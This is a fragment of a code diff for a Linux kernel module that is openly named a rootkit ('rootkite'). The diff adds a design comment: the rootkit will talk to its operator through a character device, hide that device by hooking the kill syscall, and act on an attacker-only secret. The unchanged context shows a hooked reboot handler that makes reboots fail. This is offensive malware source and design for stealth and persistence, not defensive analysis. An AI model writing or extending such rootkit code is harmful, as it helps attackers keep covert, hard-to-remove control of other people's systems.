@@ -25,7 +25,11 @@ MODULE_DESCRIPTION("rootkite");
 MODULE_AUTHOR("NondairyDig");
 MODULE_VERSION("1.0");
 
-
+/*
+NEW PLAN: make the rootkit communicate through the chardev. 
+The hiding of the chardev will be through the kill funciton that will be hooked at the start.
+the actions will be depoendent on a "secret" that is known only to the attacker that uses the kit.
+*/
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage int hack_reboot(const struct pt_regs *regs){
     return -1; //return error when trying to reboot
